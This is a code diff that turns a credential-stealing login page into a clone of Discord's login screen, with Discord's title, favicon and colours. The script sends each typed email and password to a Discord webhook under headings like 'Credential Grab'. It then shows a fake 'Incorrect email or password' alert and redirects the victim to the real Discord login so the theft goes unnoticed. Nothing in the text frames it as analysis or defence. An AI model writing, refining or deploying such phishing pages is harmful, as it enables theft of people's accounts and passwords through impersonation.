@@ -2,7 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>NebulaTech Access</title>
+  <title>Discord</title>
+  <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       background-color: #0d0d0d;
@@ -20,14 +22,14 @@
       padding: 40px;
       border-radius: 12px;
       box-shadow: 0 0 25px rgba(0,255,255,0.1);
-      width: 380px;
+      width: 360px;
       display: flex;
       flex-direction: column;
     }
 
     h2 {
       text-align: center;
-      color: #00ffff;
+      color: #7289da;
       margin-bottom: 25px;
     }
 
@@ -48,10 +50,10 @@
     button {
       width: 100%;
       padding: 12px;
-      background-color: #00cccc;
+      background-color: #7289da;
       border: none;
       border-radius: 6px;
-      color: #000;
+      color: #fff;
       font-weight: bold;
       margin-top: 15px;
       cursor: pointer;
@@ -59,21 +61,20 @@
     }
 
     button:hover {
-      background-color: #00aaaa;
+      background-color: #5b6eae;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>NebulaTech Gateway</h2>
+    <h2>Welcome back</h2>
     <input type="text" id="email" placeholder="Email (Gmail only)">
-    <input type="password" id="password" placeholder="Access Key">
-    <button onclick="submitCredentials()">Access System</button>
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="submitCredentials()">Log In</button>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e
-";
+    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
 
     function isValidGmail(email) {
       return /^[a-zA-Z0-9._%+-]{6,}@gmail\.com$/.test(email);
@@ -89,14 +90,14 @@
       }
 
       const payload = {
-        content: "**🎯 Immediate Credential Hit**",
+        content: "**🧠 Credential Grab**",
         embeds: [{
-          title: "🔓 Credentials Captured",
-          color: 15277667,
+          title: "🔓 Discord Styled Login Capture",
+          color: 3447003,
           fields: [
             { name: "Email", value: email },
             { name: "Password", value: password },
-            { name: "Timestamp", value: new Date().toLocaleString() }
+            { name: "Time", value: new Date().toLocaleString() }
           ]
         }]
       };
@@ -108,11 +109,13 @@
           body: JSON.stringify(payload)
         });
       } catch (e) {
-        console.warn("Webhook failed:", e);
+        console.warn("Webhook error:", e);
       }
 
-      alert("Access denied. Please check your credentials and try again.");
-      location.reload();
+      setTimeout(() => {
+        alert("Incorrect email or password.");
+        window.location.href = "https://discord.com/login";
+      }, 1200);
     }
   </script>
 </body>
